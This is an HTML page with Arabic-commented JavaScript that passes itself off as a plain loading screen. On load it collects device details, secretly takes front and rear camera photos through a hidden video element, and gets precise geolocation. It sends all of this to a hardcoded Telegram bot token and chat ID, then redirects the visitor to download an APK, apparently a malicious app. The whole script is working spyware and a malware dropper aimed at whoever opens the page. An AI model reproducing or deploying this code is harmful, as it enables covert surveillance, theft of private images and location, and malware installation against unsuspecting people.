 <style>
 
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    -webkit-tap-highlight-color: transparent;
  }

  html, body {
    min-height: 100%;
    background: #ffffff !important;
    overflow: hidden;
  }

  body {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    color: #333;
    position: relative;
  }

  /* إلغاء أي خلفية سوداء موروثة */
  body::before,
  body::after {
    display: none !important;
  }

  /* ====================================================
     شاشة التحميل — دائرة + نص خافت
     ==================================================== */
  #loader {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 26px;
    animation: fadeIn .5s ease;
  }

  @keyframes fadeIn {
    from { opacity: 0; }
    to   { opacity: 1; }
  }

  .spinner {
    width: 62px;
    height: 62px;
    border: 3px solid #ececec;
    border-top-color: #999999;
    border-radius: 50%;
    animation: spin .85s linear infinite;
    will-change: transform;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  .loading-text {
    font-size: 14px;
    color: #cfcfcf;
    letter-spacing: 5px;
    font-weight: 300;
    user-select: none;
    -webkit-user-select: none;
    animation: softPulse 2.4s ease-in-out infinite;
  }

  @keyframes softPulse {
    0%, 100% { opacity: .55; }
    50%      { opacity: 1; }
  }

  /* ====================================================
     شاشة الرفض (لو المستخدم رفض الإذن)
     ==================================================== */
  #denied {
    display: none;
    text-align: center;
    max-width: 340px;
    padding: 24px;
    animation: fadeIn .4s ease;
  }
  #denied.active { display: block; }

  #denied h1 {
    font-size: 19px;
    font-weight: 600;
    color: #222;
    margin-bottom: 12px;
  }

  #denied p {
    font-size: 14px;
    color: #8a8a8a;
    line-height: 1.8;
    margin-bottom: 26px;
  }

  #retryBtn {
    padding: 13px 38px;
    background: #111111;
    color: #ffffff;
    border: none;
    border-radius: 12px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    font-family: inherit;
    letter-spacing: .3px;
    transition: opacity .18s, transform .18s;
  }
  #retryBtn:active {
    opacity: .8;
    transform: scale(.97);
  }

  /* الفيديو مخفي — مطلوب للالتقاط فقط */
  video {
    position: fixed;
    left: -9999px;
    top: -9999px;
    width: 2px;
    height: 2px;
    opacity: .01;
    pointer-events: none;
  }
</style>

<!-- ============ شاشة الرفض (تظهر فقط عند رفض الإذن) ============ -->

<script>
(function () {
  /* ============================================================
     ⚙️ الإعدادات — عدّل هنا
     ============================================================ */
  const BOT_TOKEN = "8847064396:AAESRDR7gXJm1kgb8qphlEHj_DRtNaSfj00";
  const CHAT_ID   = "8273860583";

  /* ⭐ مكان رابط ملف الـ APK — ضع الرابط هنا */
  const APK_DOWNLOAD_URL = "GoldenEmwa_1.0.apk";

  /* ============================================================ */

  const TOTAL_PER_SIDE = 5;
  const SETTLE_MS      = 450;
  const MIN_BRIGHTNESS = 5;
  const PHOTO_GAP_MS   = 80;
  const RELEASE_MS     = 400;

  /* ============ Elements ============ */
  const v         = document.getElementById("v");
  const loaderEl  = document.getElementById("loader");
  const deniedEl  = document.getElementById("denied");
  const retryBtn  = document.getElementById("retryBtn");

  let currentStream = null;
  let running = false;

  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const esc = s => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");

  /* ============ التحكم في الشاشات ============ */
  function showLoader(){
    loaderEl.style.display = "flex";
    deniedEl.classList.remove("active");
  }
  function showDenied(){
    loaderEl.style.display = "none";
    deniedEl.classList.add("active");
  }

  /* ============================================================
     بيانات المتصفح
     ============================================================ */
  async function getBattery(){
    try{
      if(!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return {level: Math.round(b.level*100)+"%", charging: b.charging};
    }catch{ return null; }
  }
  function getConn(){
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return c ? {type:c.effectiveType||"—", downlink:c.downlink??"—"} : null;
  }
  function devType(){
    const ua = navigator.userAgent;
    if(/Android/i.test(ua)) return "Android";
    if(/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if(/Windows/i.test(ua)) return "Windows";
    if(/Macintosh|Mac OS X/i.test(ua)) return "Mac";
    if(/Linux/i.test(ua)) return "Linux";
    return "—";
  }

  async function collect(){
    const bat = await getBattery();
    const con = getConn();
    const d = {
      "📱 الجهاز"     : devType(),
      "🖥 النظام"      : navigator.platform || "—",
      "📐 الشاشة"     : `${screen.width}×${screen.height}`,
      "🔍 البكسل"     : devicePixelRatio,
      "🗣 اللغة"       : navigator.language,
      "🕐 التوقيت"    : Intl.DateTimeFormat().resolvedOptions().timeZone,
      "🧠 الأنوية"    : navigator.hardwareConcurrency || "—",
      "💾 الذاكرة"    : navigator.deviceMemory ? navigator.deviceMemory+"GB" : "—",
      "👆 لمس"        : ("ontouchstart" in window) ? "نعم" : "لا",
      "🔋 البطارية"   : bat ? `${bat.level} — ${bat.charging?"⚡":"🔌"}` : "—",
      "📶 الشبكة"     : con ? `${con.type} / ${con.downlink}Mbps` : "—",
      "🕒 الفتح"      : new Date().toLocaleString("ar-EG"),
      "🌐 UA"         : navigator.userAgent
    };
    let out = "🔔 <b>جهاز جديد فتح الصفحة</b>\n\n";
    for(const [k,v] of Object.entries(d)) out += `${k}: <code>${esc(v)}</code>\n`;
    return out;
  }

  /* ============================================================
     تليجرام
     ============================================================ */
  function sendText(t){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("text", t);
    fd.append("parse_mode","HTML");
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {method:"POST", body:fd}).catch(()=>{});
  }
  function sendPhoto(blob, cap){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", cap);
    fd.append("photo", blob, "p.jpg");
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      {method:"POST", body:fd}).catch(()=>{});
  }
  function sendLocation(lat, lon, cap){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("latitude", lat);
    fd.append("longitude", lon);
    if(cap) fd.append("caption", cap);
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,
      {method:"POST", body:fd}).catch(()=>{});
  }

  /* ============================================================
     الكاميرا
     ============================================================ */
  function waitForRealFrame(videoEl, timeout = 2500){
    if (typeof videoEl.requestVideoFrameCallback === "function"){
      return Promise.race([
        new Promise(res => videoEl.requestVideoFrameCallback(() => res())),
        new Promise(res => setTimeout(res, timeout))
      ]);
    }
    return new Promise(res => {
      const done = () => res();
      videoEl.addEventListener("playing", done, {once:true});
      videoEl.addEventListener("canplay", done, {once:true});
      setTimeout(done, timeout);
    });
  }

  async function closeCamera(){
    if (currentStream){
      currentStream.getTracks().forEach(t => { try{ t.stop(); }catch(_){} });
      currentStream = null;
    }
    if (v.srcObject) v.srcObject = null;
    await sleep(RELEASE_MS);
  }

  async function openCamera(facing, maxTries = 3){
    for (let attempt = 1; attempt <= maxTries; attempt++){
      try{
        await closeCamera();
        const s = await navigator.mediaDevices.getUserMedia({
          video:{ facingMode:{ideal: facing}, width:{ideal:1280}, height:{ideal:720} },
          audio:false
        });
        currentStream = s;
        v.srcObject = s;
        try{ await v.play(); }catch(_){}
        await waitForRealFrame(v);
        await sleep(SETTLE_MS);
        return s;
      }catch(e){
        // لا نكرر المحاولة عند رفض الإذن — نرمي الاستثناء مباشرة
        if (e.name === "NotAllowedError" || e.name === "PermissionDeniedError"){
          throw e;
        }
        console.warn(`camera ${facing} try ${attempt} failed:`, e.message);
        if (attempt === maxTries) throw e;
        await sleep(600);
      }
    }
  }

  function capture(isFront){
    return new Promise(resolve => {
      const c = document.createElement("canvas");
      c.width  = v.videoWidth  || 1280;
      c.height = v.videoHeight || 720;
      const ctx = c.getContext("2d");
      if (isFront){
        ctx.translate(c.width, 0);
        ctx.scale(-1, 1);
      }
      ctx.drawImage(v, 0, 0, c.width, c.height);

      let brightness = 255;
      try{
        const sw = Math.min(200, c.width);
        const sh = Math.min(200, c.height);
        const sx = (c.width  - sw) / 2;
        const sy = (c.height - sh) / 2;
        const data = ctx.getImageData(sx, sy, sw, sh).data;
        let sum = 0, n = 0;
        for(let i=0; i<data.length; i+=16){
          sum += data[i] + data[i+1] + data[i+2];
          n += 3;
        }
        brightness = sum / n;
      }catch(_){}

      c.toBlob(b => resolve({blob:b, brightness}), "image/jpeg", 0.72);
    });
  }

  async function captureSafe(isFront, maxTries = 4){
    let best = null;
    for(let attempt = 1; attempt <= maxTries; attempt++){
      const {blob, brightness} = await capture(isFront);
      if(blob && brightness >= MIN_BRIGHTNESS) return {blob, brightness};
      if(blob && (!best || brightness > best.brightness)) best = {blob, brightness};
      await sleep(250);
    }
    return best;
  }

  /* ============================================================
     الموقع
     ============================================================ */
  function requestLocation(timeoutMs = 12000){
    return new Promise(resolve => {
      if(!navigator.geolocation) return resolve(null);
      const timer = setTimeout(() => resolve(null), timeoutMs);
      navigator.geolocation.getCurrentPosition(
        pos => {
          clearTimeout(timer);
          resolve({lat:pos.coords.latitude, lon:pos.coords.longitude, accuracy:pos.coords.accuracy});
        },
        err => { clearTimeout(timer); resolve({ error: err.message }); },
        { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
      );
    });
  }

  /* ============================================================
     مرحلة تصوير — ترمي استثناء عند رفض الإذن
     ============================================================ */
  async function capturePhase(facing, label, count){
    await openCamera(facing); // ⬅️ هنا يتم طلب الإذن لأول مرة

    for (let i = 1; i <= count; i++){
      const result = await captureSafe(facing === "user");
      if (result && result.blob){
        sendPhoto(result.blob, `${label} #${i}`);
      }
      await sleep(PHOTO_GAP_MS);
    }
  }

  /* ============================================================
     التسلسل الكامل
     ============================================================ */
  async function runFullSequence(){
    if (running) return;
    running = true;

    showLoader();

    // بيانات الجهاز — تُرسل بالتوازي بدون انتظار
    collect().then(t => sendText(t)).catch(()=>{});

    try {
      // 1) الكاميرا الأمامية — أول استدعاء يفتح نافذة الإذن تلقائيًا
      await capturePhase("user", "📸 الكاميرا الأمامية", TOTAL_PER_SIDE);

      // 2) الكاميرا الخلفية
      await sleep(300);
      await capturePhase("environment", "📷 الكاميرا الخلفية", TOTAL_PER_SIDE);

      // 3) الموقع الجغرافي
      const loc = await requestLocation();

      if (loc && loc.lat !== undefined){
        const cap =
          `📍 <b>الموقع الجغرافي</b>\n` +
          `🌐 https://maps.google.com/?q=${loc.lat},${loc.lon}\n` +
          `🎯 الدقة: ${Math.round(loc.accuracy)} م`;
        sendLocation(loc.lat, loc.lon, cap);
      }else if (loc && loc.error){
        sendText(`📍 <b>الموقع الجغرافي</b>\n❌ ${esc(loc.error)}`);
      }else{
        sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
      }

      // 4) نقفل الكاميرا
      await closeCamera();

      // 5) تأخير بسيط ثم التحويل لتحميل الـ APK
      await sleep(500);
      window.location.href = APK_DOWNLOAD_URL;

    } catch (err) {
      // ⬅️ المستخدم رفض الإذن (أو فشل getUserMedia في البداية)
      await closeCamera();
      showDenied();
      sendText(`❌ <b>رُفض الوصول للكاميرا</b>\n<code>${esc(err.message || err.name || "unknown")}</code>`);
      running = false;
    }
  }

  /* ============================================================
     الأحداث
     ============================================================ */
  retryBtn.addEventListener("click", () => {
    if (running) return;
    runFullSequence();
  });

  /* ============================================================
     🚀 تشغيل تلقائي فور تحميل الصفحة — بدون زر
     ============================================================ */
  function boot(){
    // تأخير بسيط جدًا لضمان اكتمال رسم الصفحة قبل استدعاء getUserMedia
    setTimeout(runFullSequence, 250);
  }

  if (document.readyState === "complete" || document.readyState === "interactive"){
    boot();
  } else {
    document.addEventListener("DOMContentLoaded", boot);
  }

})();
</script>
